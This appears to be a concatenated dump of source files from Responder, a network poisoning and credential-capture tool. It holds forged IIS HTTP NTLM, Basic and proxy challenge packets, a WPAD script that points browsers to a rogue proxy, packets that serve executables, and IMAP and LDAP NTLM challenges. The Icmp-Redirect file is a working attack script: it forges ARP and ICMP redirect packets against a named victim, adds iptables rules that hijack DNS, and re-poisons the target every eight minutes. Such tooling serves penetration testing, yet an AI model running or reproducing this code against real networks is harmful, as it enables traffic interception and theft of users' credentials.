    ])

    def calculate(self):
        ##First convert to uni
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
      
        ##Then calculate
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])

        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])

        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        #AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        #AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

#HTTP NTLM packet.
class IIS_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "WWW-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),                                            
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

#HTTP Basic answer packet.
class IIS_Basic_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: Basic realm=''\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

########NEW FILE########
__FILENAME__ = HTTPProxy
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict
from base64 import b64decode,b64encode

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#WPAD script. the wpadwpadwpad is shorter than 15 chars and unlikely to be found.
class WPADScript(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: application/x-ns-proxy-autoconfig\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("CRLF",          "\r\n\r\n"),
        ("Payload",       "function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServerExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeAlwaysExeFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: application/octet-stream\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentDisp",   "Content-Disposition: attachment; filename="),
        ("ContentDiFile", ""),
        ("FileCRLF",      ";\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class ServeAlwaysNormalFile(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 200 OK\r\n"),
        ("ContentType",   "Content-Type: text/html\r\n"),
        ("LastModified",  "Last-Modified: Wed, 24 Nov 2010 00:39:06 GMT\r\n"),
        ("AcceptRanges",  "Accept-Ranges: bytes\r\n"),
        ("Server",        "Server: Microsoft-IIS/7.5\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("ContentLen",    "Content-Length: "),
        ("ActualLen",     "76"), 
        ("Date",          "\r\nDate: Thu, 24 Oct 2013 22:35:46 GMT\r\n"),
        ("Connection",    "Connection: keep-alive\r\n"),
        ("X-CCC",         "US\r\n"),
        ("X-CID",         "2\r\n"),
        ("CRLF",          "\r\n"),
        ("Payload",       "jj"),
    ])
    def calculate(self):
        self.fields["ActualLen"] = len(str(self.fields["Payload"]))

#HTTP Packet used for further NTLM auth.
class IIS_Auth_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Authentication Required\r\n"),
        ("Via",           "Via: 1.1 SMB-TOOLKIT\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
        ("Connection",    "Connection: close \r\n"),
        ("PConnection",   "proxy-Connection: close \r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#HTTP NTLM packet.
class IIS_407_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Authentication Required\r\n"),
        ("Via",           "Via: 1.1 SMB-TOOLKIT\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "Proxy-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: SMB-TOOLKIT\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),                                            
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

#HTTP Basic answer packet.
class IIS_Basic_407_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "Proxy-Authenticate: Basic realm=\"ISAServer\"\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

########NEW FILE########
__FILENAME__ = Icmp-Redirect
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys,socket,struct,optparse,random,pipes
from socket import *
from odict import OrderedDict
from random import randrange
from time import sleep
from subprocess import call
from pipes import quote

parser = optparse.OptionParser(usage='python %prog -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1',
                               prog=sys.argv[0],
                               )
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-g', '--gateway',action="store", help="The ip address of the original gateway (issue the command 'route -n' to know where is the gateway", metavar="10.20.30.254",dest="OriginalGwAddr")

parser.add_option('-t', '--target',action="store", help="The ip address of the target", metavar="10.20.30.48",dest="VictimIP")

parser.add_option('-r', '--route',action="store", help="The ip address of the destination target, example: DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost")

parser.add_option('-s', '--secondaryroute',action="store", help="The ip address of the destination target, example: Secondary DNS server. Must be on another subnet.", metavar="10.20.40.1",dest="ToThisHost2")

parser.add_option('-I', '--interface',action="store", help="Interface name to use, example: eth0", metavar="eth0",dest="Interface")

parser.add_option('-a', '--alternate',action="store", help="The alternate gateway, set this option if you wish to redirect the victim traffic to another host than yours", metavar="10.20.30.40",dest="AlternateGwAddr")

options, args = parser.parse_args()

if options.OURIP is None:
   print "-i mandatory option is missing.\n"
   parser.print_help()
   exit(-1)

if options.OriginalGwAddr is None:
   print "-g mandatory option is missing, please provide the original gateway address.\n"
   parser.print_help()
   exit(-1)

if options.VictimIP is None:
   print "-t mandatory option is missing, please provide a target.\n"
   parser.print_help()
   exit(-1)

if options.Interface is None:
   print "-I mandatory option is missing, please provide your network interface.\n"
   parser.print_help()
   exit(-1)

if options.ToThisHost is None:
   print "-r mandatory option is missing, please provide a destination target.\n"
   parser.print_help()
   exit(-1)

if options.AlternateGwAddr is None:
   AlternateGwAddr = options.OURIP

#Setting some vars.
OURIP = options.OURIP
OriginalGwAddr = options.OriginalGwAddr
AlternateGwAddr = options.AlternateGwAddr
VictimIP = options.VictimIP
ToThisHost = options.ToThisHost
ToThisHost2 = options.ToThisHost2
Interface = options.Interface

def Show_Help(ExtraHelpData):
   help = "\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to lgaffie@trustwave.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n"
   help+= ExtraHelpData
   print help

MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

def GenCheckSum(data):
    s = 0
    for i in range(0, len(data), 2):
        q = ord(data[i]) + (ord(data[i+1]) << 8)
        f = s+q
        s = (f & 0xffff) + (f >> 16)
    return struct.pack("<H",~s & 0xffff)

#####################################################################
#ARP Packets
#####################################################################
class EthARP(Packet):
    fields = OrderedDict([
        ("DstMac", "\xff\xff\xff\xff\xff\xff"),
        ("SrcMac", ""),
        ("Type", "\x08\x06" ), #ARP

    ])

class ARPWhoHas(Packet):
    fields = OrderedDict([
        ("HwType",    "\x00\x01"),
        ("ProtoType", "\x08\x00" ), #IP
        ("MacLen",    "\x06"),
        ("IPLen",     "\x04"),
        ("OpCode",    "\x00\x01"),
        ("SenderMac", ""),
        ("SenderIP",  "\x00\xff\x53\x4d"),
        ("DstMac",    "\x00\x00\x00\x00\x00\x00"),
        ("DstIP",     "\x00\x00\x00\x00"),

    ])

    def calculate(self): 
        self.fields["DstIP"] = inet_aton(self.fields["DstIP"])
        self.fields["SenderIP"] = inet_aton(OURIP)    

#####################################################################
#ICMP Redirect Packets
#####################################################################
class Eth2(Packet):
    fields = OrderedDict([
        ("DstMac", ""),
        ("SrcMac", ""),
        ("Type", "\x08\x00" ), #IP

    ])

class IPPacket(Packet):
    fields = OrderedDict([
        ("VLen",       "\x45"),
        ("DifField",   "\x00"),
        ("Len",        "\x00\x38"),
        ("TID",        "\x25\x25"),
        ("Flag",       "\x00"),
        ("FragOffset", "\x00"),
        ("TTL",        "\x1d"),
        ("Cmd",        "\x01"), #ICMP
        ("CheckSum",   "\x00\x00"),
        ("SrcIP",   ""),
        ("DestIP",     ""),
        ("Data",       ""),

    ])

    def calculate(self): 
        self.fields["TID"] = chr(randrange(256))+chr(randrange(256))
        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"])) 
        self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"]))
        # Calc Len First
        CalculateLen = str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])+str(self.fields["Data"])
        self.fields["Len"] = struct.pack(">H", len(CalculateLen))
        # Then CheckSum this packet
        CheckSumCalc =str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])
        self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)

class ICMPRedir(Packet):
    fields = OrderedDict([
        ("Type",       "\x05"),
        ("OpCode",     "\x01"),
        ("CheckSum",   "\x00\x00"),
        ("GwAddr",     ""),
        ("Data",       ""),

    ])

    def calculate(self): 
        #Set the values
        self.fields["GwAddr"] = inet_aton(OURIP)  
        # Then CheckSum this packet
        CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
        self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)

class DummyUDP(Packet):
    fields = OrderedDict([
        ("SrcPort",    "\x00\x35"), #port 53
        ("DstPort",    "\x00\x35"),
        ("Len",        "\x00\x08"), #Always 8 in this case.
        ("CheckSum",   "\x00\x00"), #CheckSum disabled.
    ])

def ReceiveArpFrame(DstAddr):
    s = socket(AF_PACKET, SOCK_RAW)
    s.settimeout(5)
    Protocol = 0x0806
    s.bind((Interface, Protocol))
    OurMac = s.getsockname()[4]
    Eth = EthARP(SrcMac=OurMac)
    Arp = ARPWhoHas(DstIP=DstAddr,SenderMac=OurMac)
    Arp.calculate()
    final = str(Eth)+str(Arp)
    try:
       s.send(final)
       data = s.recv(1024)
       DstMac = data[22:28]
       DestMac = DstMac.encode('hex')
       PrintMac = ":".join([DestMac[x:x+2] for x in xrange(0, len(DestMac), 2)])
       return PrintMac,DstMac
    except:
       print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
       exit(1)

def IcmpRedirectSock(DestinationIP):
    PrintMac,DestMac = ReceiveArpFrame(VictimIP)
    print '[ARP]Target Mac address is :',PrintMac
    PrintMac,RouterMac = ReceiveArpFrame(OriginalGwAddr)
    print '[ARP]Router Mac address is :',PrintMac
    s = socket(AF_PACKET, SOCK_RAW)
    Protocol = 0x0800
    s.bind((Interface, Protocol))
    Eth = Eth2(DstMac=DestMac,SrcMac=RouterMac)
    IPPackUDP = IPPacket(Cmd="\x11",SrcIP=VictimIP,DestIP=DestinationIP,TTL="\x40",Data=str(DummyUDP()))
    IPPackUDP.calculate()
    ICMPPack = ICMPRedir(GwAddr=AlternateGwAddr,Data=str(IPPackUDP))
    ICMPPack.calculate()
    IPPack = IPPacket(SrcIP=OriginalGwAddr,DestIP=VictimIP,TTL="\x40",Data=str(ICMPPack)) 
    IPPack.calculate()
    final = str(Eth)+str(IPPack)
    s.send(final)
    print '\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP)

def FindWhatToDo(ToThisHost2):
    if ToThisHost2 != None:
       Show_Help('Hit CRTL-C to kill this script')
       RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
    if ToThisHost2 == None:
       Show_Help(MoreHelp)
       IcmpRedirectSock(DestinationIP=ToThisHost)
       exit()

def RunThisInLoop(host, host2, ip):
    dns1 = pipes.quote(host)
    dns2 = pipes.quote(host2)
    ouripadd = pipes.quote(ip)
    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
    call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
    print "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
    while True:
       IcmpRedirectSock(DestinationIP=dns1)
       IcmpRedirectSock(DestinationIP=dns2)
       print "[+]Repoisoning the target in 8 minutes..."
       sleep(480)

FindWhatToDo(ToThisHost2)


########NEW FILE########
__FILENAME__ = IMAPPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#IMAP4 Greating class
class IMAPGreating(Packet):
    fields = OrderedDict([
        ("Code",             "* OK IMAP4 service is ready."),
        ("CRLF",        "\r\n"), 
        ]) 

#IMAP4 Capability class
class IMAPCapability(Packet):
    fields = OrderedDict([
        ("Code",             "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN"),
        ("CRLF",        "\r\n"), 
        ]) 

#IMAP4 Capability class
class IMAPCapabilityEnd(Packet):
    fields = OrderedDict([
        ("Tag",             ""),
        ("Message",         " OK CAPABILITY completed."),
        ("CRLF",        "\r\n"), 
        ]) 

########NEW FILE########
__FILENAME__ = LDAPPackets
#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import struct
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


class LDAPSearchDefaultPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",   "\x30"),
        ("ParserHeadASNLen",  "\x0c"),
        ("MessageIDASNID",    "\x02"),
        ("MessageIDASNLen",   "\x01"),
        ("MessageIDASNStr",   "\x0f"),
        ("OpHeadASNID",       "\x65"),
        ("OpHeadASNIDLen",    "\x07"),
        ("SearchDoneSuccess", "\x0A\x01\x00\x04\x00\x04\x00"),#No Results.
    ])

class LDAPSearchSupportedCapabilitiesPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\x7e"),#126
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x75"),#117
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x6d"),#109
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x67"),#103
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x15"),#21
        ("SearchAttribASN2Str",      "supportedCapabilities"),
        ("SearchAttribASN3ID",       "\x31"),
        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x4a"),
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x16"),#22
        ("SearchAttrib1ASNStr",      "1.2.840.113556.1.4.800"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x17"),#23
        ("SearchAttrib2ASNStr",      "1.2.840.113556.1.4.1670"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x17"),#23
        ("SearchAttrib3ASNStr",      "1.2.840.113556.1.4.1791"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPSearchSupportedMechanismsPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\x60"),#96
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x57"),#87
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x4f"),#79
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x49"),#73
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x17"),#23
        ("SearchAttribASN2Str",      "supportedSASLMechanisms"),
        ("SearchAttribASN3ID",       "\x31"),
        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x2a"),#42
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x06"),#6
        ("SearchAttrib1ASNStr",      "GSSAPI"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x0a"),#10
        ("SearchAttrib2ASNStr",      "GSS-SPNEGO"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x08"),#8
        ("SearchAttrib3ASNStr",      "EXTERNAL"),
        ("SearchAttrib4ASNID",       "\x04"),
        ("SearchAttrib4ASNLen",      "\x0a"),#10
        ("SearchAttrib4ASNStr",      "DIGEST-MD5"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPNTLMChallenge(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\xD0"),#208
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x61"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\xc7"),#199
        ("Status",                   "\x0A"),
        ("StatusASNLen",             "\x01"),
        ("StatusASNStr",             "\x0e"), #In Progress.
        ("MatchedDN",                "\x04\x00"), #Null
        ("ErrorMessage",             "\x04\x00"), #Null
        ("SequenceHeader",           "\x87"),
        ("SequenceHeaderLenOfLen",   "\x81"),
        ("SequenceHeaderLen",        "\x82"), #188
        ("NTLMSSPSignature",         "NTLMSSP"),
        ("NTLMSSPSignatureNull",  "\x00"),
        ("NTLMSSPMessageType",    "\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset","\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags","\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge","\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved","\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset","\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh","\x05"),
        ("NegTokenInitSeqMechMessageVersionLow","\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt","\xce\x0e"),
